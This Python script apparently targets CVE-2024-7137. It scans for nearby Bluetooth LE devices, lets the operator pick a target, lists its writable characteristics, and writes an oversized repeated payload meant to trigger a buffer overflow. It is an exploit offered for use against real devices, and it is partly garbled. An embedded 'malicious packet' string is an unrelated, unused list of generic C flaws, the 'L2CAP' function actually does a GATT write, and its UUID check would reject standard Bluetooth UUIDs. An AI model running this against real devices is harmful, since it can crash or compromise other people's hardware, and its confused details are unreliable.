import asyncio
from bleak import BleakScanner, BleakClient
from uuid import UUID

# Create a malicious test packet with a size much larger than expected
malicious_packet = """CVE-2024-7137 Vulnerability in C code\n\n1. Array out of bounds: The code tries to access `id_sequence[3]` when only 3 elements are assigned.\n2. Unvalidated size in memcpy: If `returnChunkSize()` returns a negative value, `memcpy()` could attempt to copy more memory than available, causing overflow.\n3. Unchecked value: `gethostbyaddr()` could return a null pointer, causing dereferencing.\n4. Buffer overflow: The code assumes string expansion is by a factor of 4, which could overflow if there are too many '&' characters.\n5. Buffer underwrite: Incorrect index calculation with `strstr()` could result in out-of-bounds buffer access.\n6. Out-of-range error: The code allocates memory for widgets without considering the NULL pointer at the end, which could cause overflow when accessing an out-of-bounds index.\n\nRecommendation: Check array bounds, validate sizes, and ensure proper memory management."""

async def discover_devices(scan_timeout=5, max_retries=3):
    """
    Scans and displays available Bluetooth devices, with retry attempts in case of no devices detected.
    """
    print("[*] Starting Bluetooth device scan for nearby devices...")

    retries = 0
    while retries < max_retries:
        devices = await BleakScanner.discover(timeout=scan_timeout)
        if devices:
            print("\n[+] Devices found:")
            for i, device in enumerate(devices):
                print(f"{i}: {device.name or 'Unknown'} - {device.address}")
            try:
                choice = int(input("\nSelect the number of the target device from the list to connect: "))
                if 0 <= choice < len(devices):
                    print(f"[+] You selected the device: {devices[choice].name or 'Unknown'} with address {devices[choice].address}")
                    return devices[choice].address
            except ValueError:
                print("[!] Invalid selection. Please enter a valid number.")
            return None
        else:
            print(f"[!] No Bluetooth devices detected. Retrying... ({retries + 1}/{max_retries})")
            retries += 1
            await asyncio.sleep(2)  # Wait before retrying

    print("[!] No devices detected after several attempts. Please ensure the device is powered on and nearby.")
    return None

async def list_services(target_address):
    """
    List the services and characteristics of the target device.
    """
    print(f"[*] Connecting to the device with address {target_address}...")
    try:
        async with BleakClient(target_address) as client:
            if client.is_connected:
                print(f"[+] Successfully connected to the device {target_address}")
                print("[*] Exploring the available services and characteristics on this device...")
                for service in client.services:
                    print(f"\n[+] Service found: {service.uuid}")
                    for char in service.characteristics:
                        print(f" - Characteristic: {char.uuid}")
                        if "write" in char.properties:
                            print("   * (This characteristic allows writing)")
            else:
                print("[!] Could not establish a connection to the device.")
    except Exception as e:
        print(f"[!] An error occurred while trying to connect or explore the device's services: {e}")

async def send_l2cap_packet(target_address, uuid, packet_size=512, chunk_size=512):
    """
    Sends a very large test packet to trigger a buffer overflow.
    """
    print(f"[*] Attempting to send a MALICIOUS test packet to the UUID {uuid} of the device with address {target_address}...")
    try:
        async with BleakClient(target_address) as client:
            if client.is_connected:
                print(f"[+] Successfully connected to the device {target_address}")

                # Validate the UUID
                try:
                    UUID(uuid, version=4)
                except ValueError:
                    print("[!] The provided UUID is not valid. Ensure the UUID format is correct.")
                    return

                
                # Increase the packet size to exceed the device's buffer
                print(f"[*] Generating a malicious packet of size {packet_size} bytes...")

                # Send the malicious packet all at once or in chunks
                await client.write_gatt_char(uuid, ("A0X23"  * packet_size ).encode(), response=True)

                print(f"[+] The malicious packet of {packet_size} bytes has been successfully sent.")

            else:
                print("[!] Could not connect to the device to send the packet.")
    except Exception as e:
        print(f"[!] An error occurred during connection or packet sending: {e}")

async def main():
    """
    Main controller to discover devices, list services, and test packets.
    """
    print("[*] Starting the Bluetooth device discovery process...")
    target_address = await discover_devices()
    if target_address:
        # List available services and characteristics
        await list_services(target_address)

        # Ask the user for the UUID to send a packet
        uuid = input("\nEnter the UUID of the characteristic to which you want to send the packet: ")
        await send_l2cap_packet(target_address, uuid)





if __name__ == "__main__":
    asyncio.run(main())
